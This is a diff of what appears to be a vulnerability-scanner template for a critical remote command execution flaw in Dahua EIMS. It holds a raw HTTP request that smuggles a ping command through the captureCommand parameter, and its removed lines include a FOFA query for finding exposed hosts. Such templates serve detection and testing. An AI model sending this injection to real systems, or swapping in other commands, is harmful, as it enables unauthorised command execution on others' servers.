@@ -3,12 +3,8 @@ info:
   name: 大华 EIMS captureCommand 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/eky6nk385of032to'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: eky6nk385of032to
-    fofa: app="dahua-EIMS"
 http:
 - raw:
   - 'GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20www.baidu.com%20index.pcap HTTP/1.1
